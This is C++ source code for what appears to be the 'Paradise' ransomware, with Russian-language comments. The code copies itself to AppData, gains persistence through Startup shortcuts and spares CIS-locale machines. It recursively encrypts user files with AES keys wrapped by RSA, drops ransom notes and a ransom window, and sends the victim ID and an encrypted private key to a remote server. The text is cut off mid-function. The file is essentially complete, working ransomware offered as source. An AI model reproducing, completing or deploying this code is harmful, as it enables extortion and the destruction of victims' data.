#include "Main.h"
#include "Hex.h"


/*#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:_p_tls_callback1")
#pragma data_seg(".CRT$XLB")
EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback1 = main_tls;
#pragma data_seg()*/


bool CheckCountry()
{
	// https://msdn.microsoft.com/en-us/library/windows/desktop/dd318693%28v=vs.85%29
	LANGID Lang = GetUserDefaultLangID();
	if (Lang == MAKELANGID(LANG_RUSSIAN, SUBLANG_RUSSIAN_RUSSIA) ||
		Lang == MAKELANGID(LANG_ARMENIAN, SUBLANG_ARMENIAN_ARMENIA) ||
		Lang == MAKELANGID(LANG_AZERI, SUBLANG_AZERI_CYRILLIC) ||
		Lang == MAKELANGID(LANG_AZERI, SUBLANG_AZERI_LATIN) ||
		Lang == MAKELANGID(LANG_BELARUSIAN, SUBLANG_BELARUSIAN_BELARUS) ||
		Lang == MAKELANGID(LANG_GEORGIAN, SUBLANG_GEORGIAN_GEORGIA) ||
		Lang == MAKELANGID(LANG_KAZAK, SUBLANG_KAZAK_KAZAKHSTAN) ||
		Lang == MAKELANGID(LANG_TAJIK, SUBLANG_TAJIK_TAJIKISTAN) ||
		Lang == MAKELANGID(LANG_TURKMEN, SUBLANG_TURKMEN_TURKMENISTAN) ||
		Lang == MAKELANGID(LANG_UKRAINIAN, SUBLANG_UKRAINIAN_UKRAINE) ||
		Lang == MAKELANGID(LANG_UZBEK, SUBLANG_UZBEK_CYRILLIC) ||
		Lang == MAKELANGID(LANG_UZBEK, SUBLANG_UZBEK_LATIN)
		) return true;

	// https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-language-pack-default-values

	bool eng = false;
	if (LOWORD(GetKeyboardLayout(0)) == 0x00000409) // английская раскладка клавы
	{
		SendMessage(GetForegroundWindow(), WM_INPUTLANGCHANGEREQUEST, 2, 0); // то же самое, что и shift + alt
		eng = true;
	}
	WORD layout = LOWORD(GetKeyboardLayout(0));
	if (layout == 0x00000419 ||
		layout == 0x0000042b ||
		layout == 0x0002042b ||
		layout == 0x0003042b ||
		layout == 0x0001042b ||
		layout == 0x0001042c ||
		layout == 0x0000082c ||
		layout == 0x0000042c ||
		layout == 0x00000423 ||
		layout == 0x00000437 ||
		layout == 0x00020437 ||
		layout == 0x00010437 ||
		layout == 0x00030437 ||
		layout == 0x00040437 ||
		layout == 0x0000043f ||
		layout == 0x00000428 ||
		layout == 0x00000442 ||
		layout == 0x00000422 ||
		layout == 0x00020422 ||
		layout == 0x00000843)
	{
		return true;
	}
	if (eng) SendMessage(GetForegroundWindow(), WM_INPUTLANGCHANGEREQUEST, 2, 0); // возвращаем язык обратно

	// проверка страны на 2ip
	HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnectA(hInternet, Strs::ip2, 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	HINTERNET hRequest = HttpOpenRequestA(hConnect, NULL, NULL, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
	HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
	char data[300000];
	DWORD read;
	InternetReadFile(hRequest, data, 300000, &read);
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	if (StrStr(data, Strs::russia))
		return true;

	return false;
}

LPSTR* GetNetwork()
{
	LPSTR* Folders = (LPSTR*)Mem::Alloc(MAX_NETWORKS);
	DWORD read, total, rc = ERROR_MORE_DATA, resumeh = 0;
	while (rc == ERROR_MORE_DATA)
	{
		SHARE_INFO_2 *info = NULL;
		rc = NetShareEnum(NULL, 2, (PBYTE*)&info, 8192, &read, &total, &resumeh);
		/*
		Здесь велика вероятность того, что NetShareEnum выставит ошибку 997 (Overlapped I/O operation is in progress.),
		но это никак не влияет на получение путей. Причину такого поведения не выявил.
		*/
		if (rc != ERROR_MORE_DATA && rc != ERROR_SUCCESS)
			break;
		SHARE_INFO_2 *curNetwork = info;
		for (DWORD i = 0; i < read; ++i, ++curNetwork)
		{
			Folders[i] = Mem::Utf16toUtf8(curNetwork->shi2_path);
		}
		if (info)
			NetApiBufferFree(info);
	}
	Folders[read] = 0;
	return Folders;
}

LPSTR CopyToAppData(LPSTR new_name)
{
	char RunFile[MAX_PATH], *AppDataDir = (char*)Mem::Alloc(MAX_PATH);
	/* Получаем appdata и путь к текущему процессу, если appdata встречается в этом пути - ничего не делаем, т.к.
	уже запущено с appdata, иначе копируем в appdata. */
	SHGetFolderPath(0, CSIDL_APPDATA, 0, 0, AppDataDir);
	GetModuleFileNameA(Utils::getModuleHandle0(), RunFile, MAX_PATH);
	if (!StrStr(RunFile, AppDataDir))
	{
		lstrcat(AppDataDir, "\\");
		lstrcat(AppDataDir, new_name);
		CopyFileA(RunFile, AppDataDir, FALSE);
		return AppDataDir;
	}
	return NULL;
}

/*void NTAPI main_tls(PVOID DllHandle, DWORD Reason, PVOID Reserved)
{
	static int i;
	if (i == 1)
		return;
	i = 1;

	InitApi();

	// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682499 
	// wmic bios get serialnumber
	// Для добавления детекта VirtualBox в будущем

	// Сначала сделаю процесс критическим, а только потом проверку на отладчик. Реверс-нуб должен страдать от бсод :)
	//Utils::SetCritical();
	if (Utils::IsDebugger())
		ExitProcess(0);
	// Базовая анти-отладка.
	__asm int 3

	__try
	{
		__asm
		{
			int 2dh
			push 0
			call ExitProcess
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		;
	}
}*/

bool AddAutoRun(LPSTR forceName, LPSTR description)
{
	char autoRunPath[MAX_PATH], iterPath[MAX_PATH];
	SHGetFolderPath(0, CSIDL_APPDATA, 0, 0, autoRunPath);
	lstrcat(autoRunPath, Strs::autostartPath);
	lstrcat(autoRunPath, "\\");
	// autoRunPath = C:\Users\UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
		

	wsprintf(iterPath, "%s%s", autoRunPath, "*");
	WIN32_FIND_DATAA iterData;
	char CurProc[MAX_PATH];
	GetModuleFileNameA(Utils::getModuleHandle0(), CurProc, MAX_PATH);
	HANDLE hIter = FindFirstFileA(iterPath, &iterData);
	do
	{
		if (StrStr(iterData.cFileName, Strs::lnk)) // если нашли ярлык
		{
			lstrcat(autoRunPath, iterData.cFileName);
			// autoRunPath = C:\Users\UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\название ярлыка.lnk
			if (lstrcmp(autoRunPath, CurProc) == 0)
			{
				Utils::ChangeLinkPath(autoRunPath, CurProc); // меняем путь ярлыка на путь к нашему файлу
			}
			FindClose(hIter);
			return true;
		}
	} while (FindNextFileA(hIter, &iterData));
	FindClose(hIter);
	// Сюда попадёт только в том случае, если в папке не было ни одного ярлыка для подмены.
	lstrcat(autoRunPath, forceName);
	lstrcat(autoRunPath, Strs::lnk);
	// autoRunPath = C:\Users\UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trump.lnk
	Utils::CreateLink(autoRunPath, CurProc, description); // создаём ярлык, ссылающийся на путь к файлу текущего процесса
	return false;
}



LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_CREATE:
		return EmbedBrowserObject(hwnd);
	case WM_DESTROY:
		SendMessage(hwnd, WM_CLOSE, 0, 0);
		return TRUE;
	}
	return DefWindowProcA(hwnd, uMsg, wParam, lParam);
}

wchar_t *GetHtmlStr()
{
	/* Выделяем память под страницу с запасом и копируем туда html. */
	char *str = (char*)Mem::Alloc(9500);
	ULONG finalSize;
	Funcs::pRtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM, (PBYTE)str, 4500, HtmlStr, sizeof(HtmlStr), &finalSize);
	/*
	После всех операций получаем путь такого вида: C:\Users\User\AppData\Roaming (на XP немного отличается).
	Туда будем копировать картинку.
	*/
	char imagePath[MAX_PATH];
	SHGetFolderPath(0, CSIDL_APPDATA, 0, 0, imagePath);
	lstrcat(imagePath, "\\");
	lstrcat(imagePath, Strs::paradise_png);
	/*
	Все данные копирую с их длиной + 1, чтобы скопировать null-byte и предотвратить случаи, когда что-то короче заготовки (в реале короче может быть
	наверно только почта.)
	*/
	// все необходимые для вноса данные
	LPSTR userId = Utils::GetVictimId();
	LPSTR key = readKey();
	LPSTR mailOne = data->email1;
	LPSTR mailTwo = data->email2;
	// получаем начало %ID%, копируем туда строку и копируем обратно оставшиеся данные.
	char *id_start = StrStr(str, Strs::id);
	char id_after[9000];
	lstrcpy(id_after, id_start + lstrlen(Strs::id));
	Mem::Copy(id_start, userId, lstrlen(userId));
	Mem::Copy(id_start + lstrlen(userId), id_after, lstrlen(id_after) + 1);
	// то же самое с %KEY%
	char *key_start = StrStr(str, Strs::key);
	char key_after[9000];
	lstrcpy(key_after, key_start + lstrlen(Strs::key));
	Mem::Copy(key_start, key, lstrlen(key));
	Mem::Copy(key_start + lstrlen(key), key_after, lstrlen(key_after) + 1);
	Mem::Free(key);
	// то же самое с почтами
	char *mail_1Start = StrStr(str, Strs::firstMail);
	char mail_1After[9000];
	lstrcpy(mail_1After, mail_1Start + lstrlen(Strs::firstMail));
	Mem::Copy(mail_1Start, mailOne, lstrlen(mailOne));
	Mem::Copy(mail_1Start + lstrlen(mailOne), mail_1After, lstrlen(mail_1After) + 1);
	char *mail_2Start = StrStr(str, Strs::secondMail);
	char *mail_2End = mail_2Start + lstrlen(Strs::secondMail);
	char mail_2After[9000];
	lstrcpy(mail_2After, mail_2End);
	Mem::Copy(mail_2Start, mailTwo, lstrlen(mailTwo));
	Mem::Copy(mail_2Start + lstrlen(mailTwo), mail_2After, lstrlen(mail_2After) + 1);


	// Здесь копируем картинку.
	char *imageStart = StrStr(str, Strs::image);
	char image_after[9000];
	lstrcpy(image_after, imageStart + lstrlen(Strs::image));
	Mem::Copy(imageStart, imagePath, lstrlen(imagePath));
	Mem::Copy(imageStart + lstrlen(imagePath), image_after, lstrlen(image_after) + 1);
	/*
	Создаём файл, в который запишем картинку с флагом CREATE_NEW для того, чтобы не перезаписывать лишний раз.
	(Если файл уже существовал, то imageFile будет INVALID_HANDLE_VALUE)
	*/
	HANDLE imageFile = CreateFile(imagePath, GENERIC_WRITE, 0, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
	if (imageFile != INVALID_HANDLE_VALUE)
	{
		DWORD dw;
		WriteFile(imageFile, PngImage, sizeof(PngImage), &dw, 0);
		CloseHandle(imageFile);
	}
	wchar_t* wstr = Mem::Utf8toUtf16(str);
	Mem::Free(str);
	return wstr;
}

void RegClass()
{
	WNDCLASSEX wndClass;
	Mem::Zero(&wndClass, sizeof(WNDCLASSEX));
	wndClass.cbSize = sizeof(WNDCLASSEX);
	wndClass.hInstance = NULL;
	wndClass.lpfnWndProc = WindowProc;
	wndClass.lpszClassName = Strs::trump;
	//wndClass.hCursor = (HCURSOR)LoadImage(NULL, MAKEINTRESOURCE(RESOURCE_CURSOR), IMAGE_CURSOR, 0, 0, LR_DEFAULTSIZE | LR_SHARED);
	RegisterClassExA(&wndClass);
}

void ShowNode()
{
	IWebBrowser2 *webBrowser2;
	IOleInPlaceActiveObject *olePlaceActiveObject;
	MSG msg;

	RegClass();

	// название окна будет "Paradise"
	char Paradise[20];
	lstrcpy(Paradise, Strs::paradise_png);
	PathRemoveExtensionA(Paradise);

	for (int i = 0; i < data->windowsNum; ++i)
	{
		if ((msg.hwnd = CreateWindowExA(0, Strs::trump, Paradise, WS_OVERLAPPED, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, HWND_DESKTOP, NULL, 0, 0)))
		{
			wchar_t* htmlData = GetHtmlStr();
			DisplayHTMLStr(msg.hwnd, htmlData);
			Mem::Free(htmlData);
			ShowWindow(msg.hwnd, SW_SHOW);
			UpdateWindow(msg.hwnd);
		}
	}
	IOleObject* browserObject = *((IOleObject**)GetWindowLongA(msg.hwnd, GWL_USERDATA));
	browserObject->QueryInterface(IID_IWebBrowser2, (void**)&webBrowser2);
	webBrowser2->QueryInterface(IID_IOleInPlaceActiveObject, (void**)&olePlaceActiveObject);
	while (GetMessageA(&msg, 0, 0, 0))
	{
		if (olePlaceActiveObject)
		{
			olePlaceActiveObject->TranslateAcceleratorA(&msg); // Это обеспечивает работу ctrl+c, ctrl+v и т.д.
		}

		TranslateMessage(&msg);
		DispatchMessageA(&msg);
	}
}

// Генерирует aes-128 ключ.
aes_key_t* gen_aes_key(HCRYPTPROV prov, HCRYPTKEY rsa_key)
{
	key_hdr key;
	aes_key_t* aes_key = (aes_key_t*)Mem::Alloc(sizeof(aes_key_t));
	CryptGenRandom(prov, WC_AES_KEY_LEN, key.key);
	Mem::Copy(aes_key->enc, key.key, WC_AES_KEY_LEN);
	DWORD len = WC_AES_KEY_LEN;
	// зашифровываем паблик ключом
	EnterCriticalSection(&cs);
	if (!CryptEncrypt(rsa_key, 0, TRUE, 0, aes_key->enc, &len, WC_ENCKEY_LEN))
	{
		Mem::Free(aes_key);
		LeaveCriticalSection(&cs);
		return NULL;
	}
	LeaveCriticalSection(&cs);
	key.hdr.bType = PLAINTEXTKEYBLOB;
	key.hdr.bVersion = CUR_BLOB_VERSION;
	key.hdr.reserved = 0;
	key.hdr.aiKeyAlg = CALG_AES_128;
	key.len = WC_AES_KEY_LEN;
	if (CryptImportKey(prov, (PBYTE)&key, sizeof(key), 0, CRYPT_NO_SALT, &aes_key->key))
	{
		DWORD mode = CRYPT_MODE_CBC;
		CryptSetKeyParam(aes_key->key, KP_MODE, (PBYTE)&mode, 0);
	}
	return aes_key;
}

void FileEncrypt(char *infile, HCRYPTPROV provider, HCRYPTKEY rsa_key)
{
	// https://blogs.msdn.microsoft.com/alejacma/2008/06/30/threading-issues-with-cryptoapi/

	DWORD attrs = GetFileAttributes(infile);
	if ((attrs == INVALID_FILE_ATTRIBUTES) || (attrs & FILE_ATTRIBUTE_SYSTEM)) return;

	char outfile[MAX_PATH];
	wsprintf(outfile, "%s%s{%s}.%s", infile, Strs::version, data->email1, data->extension);
	HANDLE in = CreateFileA(infile, GENERIC_READ, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	HANDLE out = CreateFileA(infile, GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (in == INVALID_HANDLE_VALUE || out == INVALID_HANDLE_VALUE) return;
	DWORD fileSize = GetFileSize(in, NULL);
	if (!fileSize)
	{
		CloseHandle(in);
		return;
	}
	aes_key_t* aes_key = gen_aes_key(provider, rsa_key);
	if (aes_key)
	{
		struct _stat64 st;
		DWORD buf_len, buf2_len;
		DWORD dw;
		BYTE buf[BLOCK_SIZE], buf2[BLOCK_SIZE];
		ReadFile(in, buf, BLOCK_SIZE, &buf_len, NULL);

		WriteFile(out, Strs::paradise_sig, lstrlen(Strs::paradise_sig), &dw, 0);
		DWORD encLen = WC_ENCKEY_LEN;
		WriteFile(out, &encLen, sizeof(DWORD), &dw, 0);
		WriteFile(out, aes_key->enc, WC_ENCKEY_LEN, &dw, 0);
		encLen = 4;
		WriteFile(out, &encLen, sizeof(DWORD), &dw, 0);
		Funcs::stat64(infile, &st);
		WriteFile(out, &st.st_size, sizeof(st.st_size), &dw, 0);

		CryptEncrypt(aes_key->key, 0, (buf_len < BLOCK_SIZE), 0, buf, &buf_len, BLOCK_SIZE);
		Mem::Copy(buf2, buf, buf_len);
		buf2_len = buf_len;
		ReadFile(in, buf, BLOCK_SIZE, &buf_len, NULL);
		CryptEncrypt(aes_key->key, 0, (buf_len < BLOCK_SIZE), 0, buf, &buf_len, BLOCK_SIZE);

		WriteFile(out, buf2, buf2_len, &buf2_len, 0);
		while (true)
		{
			Mem::Copy(buf2, buf, buf_len);
			buf2_len = buf_len;
			BOOL res = ReadFile(in, buf, BLOCK_SIZE, &buf_len, 0);
				
			WriteFile(out, buf2, buf2_len, &buf2_len, 0);

			if (!buf_len || !res) // если данных больше нет, то выходим из цикла
				break;

			if (data->is_one_block == FALSE) // если нужно шифровать весь файл, а не 50 мб, то шифруем данные 
			{
				CryptEncrypt(aes_key->key, 0, (buf_len < BLOCK_SIZE), 0, buf, &buf_len, BLOCK_SIZE);
			}
		}
		if (aes_key->key)
			CryptDestroyKey(aes_key->key);
		Mem::Free(aes_key);
		++filesInfected;
	}
	CloseHandle(out);
	CloseHandle(in);
	MoveFile(infile, outfile);
}

void dropKey(HCRYPTPROV prov, HCRYPTKEY rsa_key)
{
	char documents[MAX_PATH];
	SHGetFolderPath(0, CSIDL_MYDOCUMENTS, NULL, 0, documents);
	BYTE buf[5120];
	DWORD keyLen = sizeof(buf), dwr;
	if (CryptExportKey(rsa_key, 0, PRIVATEKEYBLOB, 0, buf, &keyLen))
	{
		HCRYPTKEY master_public = NULL;
		if (CryptImportKey(prov, data->public_key, data->public_key_len, 0, CRYPT_EXPORTABLE, &master_public))
		{
			// Копируем 245 байт (столько мы можем зашифровать rsa-2048 ключом). После шифрования размер данных будет 256 байт.
			// https://security.stackexchange.com/a/33445
			BYTE data[512];
			Mem::Copy(data, buf, 245);
			DWORD tmpLen = 245;

			CryptEncrypt(master_public, NULL, TRUE, 0, data, &tmpLen, sizeof(data));

			// Переводим зашифрованные байты в base64
			char *firstData = Crypt::base64_encode(data, tmpLen);
			// Переводим остальные байты в base64
			char *secondData = Crypt::base64_encode(&buf[245], keyLen - 245);

			LPSTR base64 = (LPSTR)Mem::Alloc(tmpLen + keyLen + 250);
			if (base64)
			{
				// Копируем зашифрованные байты + разделитель + обычные байты.
				Mem::Copy(base64, firstData, lstrlen(firstData));
				Mem::Copy(base64 + lstrlen(firstData), Strs::delimiter, lstrlen(Strs::delimiter));
				Mem::Copy(base64 + lstrlen(firstData) + 9, secondData, lstrlen(secondData) + 1);

				Mem::Free(firstData);
				Mem::Free(secondData);

				if (master_public)
					CryptDestroyKey(master_public);

				// Сохраняем зашифрованный приват ключ в документы текущего юзера.
				char keyPath[MAX_PATH];
				wsprintf(keyPath, "%s\\%s", documents, Strs::keyName);

				HANDLE hPrivateKey = CreateFileA(keyPath, GENERIC_WRITE, 0, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
				if (hPrivateKey != INVALID_HANDLE_VALUE)
				{
					WriteFile(hPrivateKey, base64, lstrlen(base64), &dwr, 0);
					CloseHandle(hPrivateKey);
				}
				Mem::Free(base64);
			}
		}
	}

	Mem::Zero(buf, sizeof(buf));
	keyLen = sizeof(buf);
	if (CryptExportKey(rsa_key, 0, PUBLICKEYBLOB, 0, buf, &keyLen))
	{
		char pubPath[MAX_PATH];
		wsprintf(pubPath, "%s\\%s", documents, Strs::publicKey);
		HANDLE hPublicKey = CreateFile(pubPath, GENERIC_WRITE, 0, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
		if (hPublicKey != INVALID_HANDLE_VALUE)
		{
			WriteFile(hPublicKey, buf, keyLen, &dwr, NULL);
			CloseHandle(hPublicKey);
		}
	}
}

void EncryptDisk(CRYPT_INFO* crypt)
{
	__try
	{
		static char winDir[MAX_PATH];
		GetWindowsDirectory(winDir, MAX_PATH);
		HANDLE hIter = NULL;
		char iterDir[MAX_PATH + 128];
		wsprintf(iterDir, "%s*", crypt->path);
		WIN32_FIND_DATA iterData;
		hIter = FindFirstFileA(iterDir, &iterData);
		if (hIter == INVALID_HANDLE_VALUE)
			return;
		CRYPT_INFO* cryptInfo = (CRYPT_INFO*)Mem::Alloc(sizeof(CRYPT_INFO));
		if (cryptInfo)
		{
			cryptInfo->prov = crypt->prov;
			cryptInfo->key = crypt->key;
			do
			{
				if (iterData.dwFileAttributes == INVALID_FILE_ATTRIBUTES)
					continue;
				wsprintf(cryptInfo->path, "%s%s", crypt->path, iterData.cFileName);

				if (lstrcmp(iterData.cFileName, ".") == 0 || lstrcmp(iterData.cFileName, "..") == 0 || StrStr(cryptInfo->path, winDir))
					continue;

				else if (iterData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					lstrcat(cryptInfo->path, "\\");
					if (!IsBrowser(cryptInfo->path))
					{
						EncryptDisk(cryptInfo);
					}
				}
				// если ещё не зашифровано и не данные софта
				else if (!StrStr(iterData.cFileName, data->extension) && lstrcmp(iterData.cFileName, Strs::paradise_png) != 0 &&
					StrNCmp(iterData.cFileName, Strs::paradise_key, 12) != 0 && !StrStr(iterData.cFileName, Strs::readme))
				{
					FileEncrypt(cryptInfo->path, cryptInfo->prov, cryptInfo->key);
				}
			} while (FindNextFileA(hIter, &iterData));
			FindClose(hIter);
			Mem::Free(cryptInfo);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		Dbg::print("SEH exception EncryptDisk\n");
	}
}

void sendInfo_WinInet(LPSTR startTime, LPSTR endTime, LPSTR key)
{
	// открываем соединение
	HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet)
	{
		HINTERNET hConnect = InternetConnect(hInternet, Strs::server, (HTTPS == 1) ? 443 : 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
		if (hConnect)
		{
			// формируем запрос
			char request[6000];
			wsprintf(request, Strs::info_fmt, Utils::GetVictimId(), data->build_id, startTime, endTime, filesInfected);
			lstrcat(request, key);
			char *req = Utils::conv_url(request);
			// отправляем запрос и закрываем соединение.
			HINTERNET hRequest = HttpOpenRequest(hConnect, Strs::post, Strs::api_link, NULL, NULL, NULL,
				(HTTPS == 1) ? INTERNET_FLAG_SECURE : INTERNET_FLAG_KEEP_CONNECTION, 0);
			if (hRequest)
			{
				HttpSendRequest(hRequest, Strs::content_type, lstrlen(Strs::content_type), req, lstrlen(req));
				InternetCloseHandle(hRequest);
			}
			Mem::Free(req);
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
}

void sendInfo_socket(LPSTR startTime, LPSTR endTime, LPSTR key)
{
	// Формируем запрос
	char request[5500], req_data[5000];
	LPSTR fixedKey = Utils::conv_url(key);
	wsprintf(req_data, Strs::info_fmt, Utils::GetVictimId(), data->build_id, startTime, endTime, filesInfected);
	lstrcat(req_data, fixedKey);
	Mem::Free(fixedKey);
	wsprintf(request, Strs::req_fmt, lstrlen(req_data));
	lstrcat(request, req_data);


	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s != INVALID_SOCKET)
	{
		SOCKADDR_IN addr;
		addr.sin_addr.s_addr = inet_addr(Strs::server);
		addr.sin_port = htons(80);
		addr.sin_family = AF_INET;
		if (connect(s, (sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR)
		{
			send(s, request, lstrlen(request), 0);
		}
		closesocket(s);
	}
}

bool checkKey()
{
	char keyPath[MAX_PATH];
	SHGetFolderPath(0, CSIDL_MYDOCUMENTS, 0, 0, keyPath);
	lstrcat(keyPath, "\\");
	lstrcat(keyPath, Strs::keyName);
	DWORD attrs = GetFileAttributes(keyPath);
	if (attrs != INVALID_FILE_ATTRIBUTES) // файл существует
	{
		return true;
	}
	return false;
}

LPSTR readKey()
{
	char keyPath[MAX_PATH];
	SHGetFolderPath(0, CSIDL_MYDOCUMENTS, 0, 0, keyPath);
	lstrcat(keyPath, "\\");
	lstrcat(keyPath, Strs::keyName);
	DWORD attrs = GetFileAttributes(keyPath);
	if (attrs != INVALID_FILE_ATTRIBUTES)
	{
		HANDLE hFile = CreateFile(keyPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			DWORD fileSize = GetFileSize(hFile, NULL);
			LPSTR key = (LPSTR)Mem::Alloc(fileSize);
			DWORD read;
			ReadFile(hFile, key, fileSize, &read, 0);
			CloseHandle(hFile);
			return key;
		}
	}
	return ""; // не NULL во избежание краша, если вдруг что-то пойдёт не так.
}

void dropNode(char *mail1, char *mail2, char *victimId)
{
	char desktopPath[MAX_PATH], docPath[MAX_PATH];
	SHGetFolderPathA(0, CSIDL_DESKTOPDIRECTORY, 0, 0, desktopPath);
	SHGetFolderPathA(0, CSIDL_MYDOCUMENTS, 0, 0, docPath);

	lstrcat(desktopPath, "\\");
	lstrcat(desktopPath, Strs::readme);
	lstrcat(desktopPath, mail1);
	lstrcat(desktopPath, ".txt");
	lstrcat(docPath, "\\");
	lstrcat(docPath, Strs::readme);
	lstrcat(docPath, mail1);
	lstrcat(docPath, ".txt");

	DWORD dw;
	char nodeInfo[1024];
	wsprintf(nodeInfo, Strs::nodeText, mail1, mail2, victimId);
	DWORD strLen = lstrlen(nodeInfo);

	HANDLE hDoc = CreateFile(docPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hDoc != INVALID_HANDLE_VALUE)
	{
		WriteFile(hDoc, nodeInfo, strLen, &dw, NULL);
		CloseHandle(hDoc);
	}
	HANDLE hDesktop = CreateFile(desktopPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hDesktop != INVALID_HANDLE_VALUE)
	{
		WriteFile(hDesktop, nodeInfo, strLen, &dw, NULL);
		CloseHandle(hDoc);
	}
}

bool checkSignature(LPSTR filePath)
{
	GUID guid = WINTRUST_ACTION_GENERIC_VERIFY_V2;
	WINTRUST_FILE_INFO wintrustFileInfo;
	WINTRUST_DATA wintrustData;

	Mem::Zero(&wintrustFileInfo, sizeof(WINTRUST_FILE_INFO));
	Mem::Zero(&wintrustData, sizeof(WINTRUST_DATA));

	LPWSTR wPath = Mem::Utf8toUtf16(filePath);

	wintrustFileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
	wintrustFileInfo.pcwszFilePath = wPath;
	wintrustFileInfo.hFile = NULL;

	wintrustData.cbStruct = sizeof(WINTRUST_DATA);
	wintrustData.dwUIChoice = WTD_UI_NONE;
	wintrustData.fdwRevocationChecks = WTD_REVOKE_NONE;
	wintrustData.dwUnionChoice = WTD_CHOICE_FILE;
	wintrustData.pFile = &wintrustFileInfo;
	wintrustData.dwStateAction = WTD_STATEACTION_VERIFY;

	HRESULT hRes = WinVerifyTrust((HWND)INVALID_HANDLE_VALUE, &guid, &wintrustData);

	Mem::Free(wPath);

	if (hRes == TRUST_E_NOSIGNATURE || hRes == TRUST_E_BAD_DIGEST) // подпись битая или отсутствует.
	{
		return false;
	}
	return true;
}

bool IsBrowser(LPSTR directory)
{
	// Если директории не содержат идентификаторов браузеров - выходим сразу, чтобы не тратить лишнее время на проверку всей директории.
	if (!StrStr(directory, Strs::operaFolder) && !StrStr(directory, Strs::firefoxFolder) &&
		!StrStr(directory, Strs::chromeFolder) && !StrStr(directory, Strs::iexploreFolder))
	{
		return false;
	}
	char iterDir[MAX_PATH + 128];
	wsprintf(iterDir, "%s*", directory);
	WIN32_FIND_DATA findData;
	HANDLE hIter = FindFirstFile(iterDir, &findData);

	if (hIter != INVALID_HANDLE_VALUE)
	{
		do
		{
			// Если найден нужный файл - проверяем его подпись, т.к. у всех нужных браузеров она имеется и возвращаем true.
			if (!lstrcmpi(findData.cFileName, Strs::chrome) ||
				!lstrcmpi(findData.cFileName, Strs::firefox) ||
				!lstrcmpi(findData.cFileName, Strs::iexplore) ||
				!lstrcmpi(findData.cFileName, Strs::opera))
			{
				char filePath[MAX_PATH];
				wsprintf(filePath, "%s%s", directory, findData.cFileName);
				if (checkSignature(filePath))
				{
					FindClose(hIter);
					return true;
				}
			}
		} while (FindNextFile(hIter, &findData));
		FindClose(hIter);
	}
	return false;
}

bool checkActive(char *processName)
{
	bool ret = false;
	PROCESSENTRY32 pe;
	Mem::Zero(&pe, sizeof(PROCESSENTRY32));
	pe.dwSize = sizeof(PROCESSENTRY32);
	DWORD curPid = GetCurrentProcessId();
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		while (Process32Next(hSnapshot, &pe))
		{
			if (lstrcmp(pe.szExeFile, processName) == 0 && pe.th32ProcessID != curPid)
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
				if (hProcess != INVALID_HANDLE_VALUE)
				{
					char procPath[MAX_PATH];
					GetModuleFileNameEx(hProcess, NULL, procPath, sizeof(procPath));
					CloseHandle(hProcess);
					char windowsDir[MAX_PATH];
					GetWindowsDirectory(windowsDir, sizeof(windowsDir));
					if (!StrStr(procPath, windowsDir))
					{
						HANDLE hFile = CreateFile(procPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
						if (hFile != INVALID_HANDLE_VALUE)
						{
							DWORD dw;
							DWORD fileSize = GetFileSize(hFile, NULL);
							void *fileBuf = Mem::Alloc(fileSize);
							ReadFile(hFile, fileBuf, fileSize, &dw, NULL);
							CloseHandle(hFile);

							PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)fileBuf;
							PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((DWORD)fileBuf + pDos->e_lfanew);
							if (pDos->e_magic == 'ZM' && pNt->Signature == IMAGE_NT_SIGNATURE)
							{
								PIMAGE_FILE_HEADER pFile = &pNt->FileHeader;
								for (int i = 0; i < pFile->NumberOfSections; ++i)
								{
									PIMAGE_SECTION_HEADER pSect = &IMAGE_FIRST_SECTION(pNt)[i];
									char name[9];
									Mem::Copy(name, pSect->Name, 8);
